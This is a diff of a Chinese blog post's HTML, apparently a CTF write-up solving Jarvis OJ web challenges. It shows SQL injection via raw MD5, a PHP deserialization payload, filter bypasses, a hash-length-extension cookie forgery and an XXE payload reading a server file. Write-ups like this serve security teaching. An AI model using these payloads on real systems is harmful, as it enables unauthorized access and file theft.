@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"ashin9.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http:&#x2F;&#x2F;xxx.com  之前没有接触过curl，只是在docker里面用过一次。 1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文">
+  <meta name="description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后 google 后发现应该在 vps 上（不用 vps 的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http:&#x2F;&#x2F;xxx.com  之前没有接触过 curl，只是在 docker 里面用过一次。 12curl就是：Linux中利用 URL 规则在命令行下工作的文件传输工具，可以说是一款很强大的 http">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jarvis OJ Web WriteUp(1)">
 <meta property="og:url" content="https://ashin9.github.io/2018/09/26/Jarvis%20OJ%20Web%20WriteUp(1)/index.html">
 <meta property="og:site_name" content="Ashing&#39;s Blog">
-<meta property="og:description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http:&#x2F;&#x2F;xxx.com  之前没有接触过curl，只是在docker里面用过一次。 1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文">
+<meta property="og:description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后 google 后发现应该在 vps 上（不用 vps 的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http:&#x2F;&#x2F;xxx.com  之前没有接触过 curl，只是在 docker 里面用过一次。 12curl就是：Linux中利用 URL 规则在命令行下工作的文件传输工具，可以说是一款很强大的 http">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-09-26T13:26:01.000Z">
-<meta property="article:modified_time" content="2021-04-11T02:19:08.000Z">
+<meta property="article:modified_time" content="2023-03-15T03:20:23.628Z">
 <meta property="article:author" content="Ashing">
 <meta property="article:tag" content="WriteUp">
 <meta name="twitter:card" content="summary">
@@ -197,7 +197,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-11 10:19:08" itemprop="dateModified" datetime="2021-04-11T10:19:08+08:00">2021-04-11</time>
+                <time title="修改时间：2023-03-15 11:20:23" itemprop="dateModified" datetime="2023-03-15T11:20:23+08:00">2023-03-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -220,29 +220,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h4><p>一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。</p>
+        <h4 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h4><p>一上来看有点懵逼，以为是Burp抓包。最后 google 后发现应该在 vps 上（不用 vps 的话经过路由器可能端口就变了）用以下命令就可以。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ocal-port http://xxx.com</span><br></pre></td></tr></table></figure>
 
-<p>之前没有接触过curl，只是在docker里面用过一次。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl就是：在linux中一个利用<span class="built_in">URL</span>规则在命令行下工作的文件传输工具，可以说是一款很强大的<span class="keyword">http</span>命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
+<p>之前没有接触过 curl，只是在 docker 里面用过一次。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl就是：Linux中利用 <span class="built_in">URL</span> 规则在命令行下工作的文件传输工具，可以说是一款很强大的 <span class="keyword">http</span> 命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称 curl 为下载工具。 </span><br><span class="line">由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h4><p>burp抓包添加头</p>
+<h4 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h4><p>burp 抓包添加头</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h4><p>抓包后发现Hint：</p>
+<h4 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h4><p>抓包后发现 Hint：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#x27;admin&#x27; where password=&#x27;&quot;.md5($pass,<span class="literal">true</span>).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>
 
 <p>首先想到MD5注入。</p>
 <p>具体原理： </p>
 <ul>
-<li>提价传入的password如果是特殊字符串，那么该字符串转化为MD5再经过PHP转化为字符串后变成： <code>&#39;or&#39;6蒥欓!r,b</code> </li>
-<li>那么最后的sql语句则变成： <code>select * from</code>admin<code>where password=&#39;&#39;or&#39;6蒥欓!r,b&#39;</code> 即成功闭合了’ bypass成功。</li>
+<li>提价传入的 password 如果是特殊字符串，那么该字符串转化为 MD5 再经过 PHP 转化为字符串后变成： <code>&#39;or&#39;6蒥欓!r,b</code> </li>
+<li>那么最后的sql语句则变成： <code>select * from</code>admin<code>where password=&#39;&#39;or&#39;6蒥欓!r,b&#39;</code> 即成功闭合了 ‘ bypass成功。</li>
 </ul>
-<h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>发现url里面有base64编码。猜测是利用base64访问任意文件。 分别读取index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本：</p>
+<h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>发现 url 里面有 base64 编码。猜测是利用 base64 访问任意文件。 分别读取 index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;pctf.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$chybeta</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$chybeta</span>));</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
 
 <p>生成序列化串：</p>
@@ -252,34 +252,33 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://web.jarvisoj.com:<span class="number">32768</span>/index.php?class=O:<span class="number">6</span>:%<span class="number">22</span>Shield%<span class="number">22</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:%<span class="number">22</span>file%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>pctf.php%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>查看源码得flag</p>
-<h4 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h4><p>右键源码发现注释Hint： index.phps </p>
-<p>访问后,发现源码：</p>
+<h4 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h4><p>右键源码发现注释Hint： index.phps 。访问后，发现源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--index.phps--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span>     <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>   (<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span>   <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;work harder!harder!  harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>题目意思是:GET传三个字符参数，然后每个参数满足以下条件： </p>
 <ul>
-<li><p>①：id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0</p>
+<li><p>1 id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0</p>
 </li>
-<li><p>②：a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php:&#x2F;&#x2F;input。 </p>
+<li><p>2 a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php:&#x2F;&#x2F;input。 </p>
 </li>
-<li><p>③：b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母！&#x3D;4.那么我们可以利用%00截断:b&#x3D;%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。</p>
+<li><p>3 b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母&#x3D;4.那么我们可以利用%00截断:b&#x3D;%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。</p>
 <p>饶过后发现<code>/^HT2mCpcvOLf</code>访问自动补全： &#96;</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/%5eHT2mCpcvOLf/i</span>ndex.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p>猜测是注入漏洞，上sqlmap发现有waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。</p>
+<p>猜测是注入漏洞，上 sqlmap 发现有 waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。</p>
 </li>
 </ul>
-<h4 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h4><p>一看题目和.so的文件有点害怕，完全没思路。 google后才知道mysql可以导入进去。</p>
-<p>导入到plugin文件中，利用该文件创建函数help_me（提示）: <code>create function help_me returns string soname &#39;udf.so&#39;</code> </p>
-<p>然后select heilp_me;提示：<code>use getflag function to obtain your flag!</code> 模仿前面创建一个getflag函数调用的flag。</p>
-<h4 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h4><p>首先想到前端认证抓个包发现cookie里面有个guest，改成admin无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS无果。 </p>
-<p>发现一个新的py脚本动态多线程工具：weakfilescan 附链接: &#96;</p>
+<h4 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h4><p>一看题目和.so的文件有点害怕，完全没思路。 google后才知道 mysql 可以导入进去。</p>
+<p>导入到 plugin 文件中，利用该文件创建函数 help_me（提示）: <code>create function help_me returns string soname &#39;udf.so&#39;</code> </p>
+<p>然后 select heilp_me; 提示：<code>use getflag function to obtain your flag!</code> 模仿前面创建一个getflag函数调用的flag。</p>
+<h4 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h4><p>首先想到前端认证抓个包发现 cookie 里面有个 guest，改成 admin 无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS 无果。 </p>
+<p>发现一个新的py脚本动态多线程工具：weakfilescan 附链接: </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ring04h/</span>weakfilescan</span><br></pre></td></tr></table></figure>
 
 <p>命令：</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> wyspider.<span class="keyword">py</span> http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32778</span></span><br></pre></td></tr></table></figure>
 
-<p>发现有个index.php~，下载notepad++打开发现乱码，挠头。。。 经过尝试发现linux有个查看文件的命令： <code>#file xxx</code> 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： <code>vim -r index.php.swp</code> 来恢复，恢复后发现源码：</p>
+<p>发现有个 index.php~，下载 notepad++ 打开发现乱码，挠头。。。 经过尝试发现 linux 有个查看文件的命令： <code>#file xxx</code> 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： <code>vim -r index.php.swp</code> 来恢复，恢复后发现源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="variable">$salt</span> = </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">        <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line">            <span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$role</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">        <span class="variable">$hsh</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>));</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;hsh&#x27;</span>,<span class="variable">$hsh</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">        echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
@@ -287,20 +286,20 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]</span><br></pre></td></tr></table></figure>
 
 
-<p>利用hash扩展攻击即可，hash拓展攻击下篇详细总结一下。可以利用hashpump直接爆破出role和hsh。不过需要注意题目反转反序列化传入顺序。 最后payload：</p>
+<p>利用 hash 扩展攻击即可，hash 拓展攻击下篇详细总结一下。可以利用 hashpump 直接爆破出 role 和 hsh。不过需要注意题目反转反序列化传入顺序。 最后payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role = s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">&quot;admin&quot;</span>%<span class="number">3</span>b%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%c0%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">80</span>s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">&quot;guest&quot;</span>%<span class="number">3</span>b`</span><br><span class="line">hsh = fcdc3840332555511c4e4323f6decb07`</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h4><p>抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有robots.txt。访问后发现.php访问的flag提交竟然不对。突然发现flag是flag{hello guest}，而题目是admin显然这是个假flag。</p>
+<h4 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h4><p>抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有 robots.txt。访问后发现 .php 访问的 flag 提交竟然不对。突然发现flag是flag{hello guest}，而题目是 admin 显然这是个假 flag。</p>
 <p>然后尝试抓包的真flag。</p>
 <h4 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h4><p>Hint：请设法获得目标机器&#x2F;home&#x2F;ctf&#x2F;flag.txt中的flag值。</p>
 <p>则想办法文件读取。加上题目提示很容易想到调用别的东西来文件读取。</p>
-<p>右键看页面源码发现有json和xml。可能就是xml注入进行任意文件读取。 抓包把content-type&#x3D;json改成content-type&#x3D;xml。然后传一段任意文件读取的xml代码：</p>
+<p>右键看页面源码发现有json和xml。可能就是 xml 注入进行任意文件读取。 抓包把content-type&#x3D;json改成content-type&#x3D;xml。然后传一段任意文件读取的xml代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt; ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
 
-<p>有关于xml的知识之前也是接触过XEE外部实体注入漏洞。后面可能出一篇能用的xml知识。</p>
+<p>有关于 xml 的知识之前也是接触过 XEE 外部实体注入漏洞。后面可能出一篇能用的 xml 知识。</p>
 
     </div>
 
@@ -407,13 +406,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
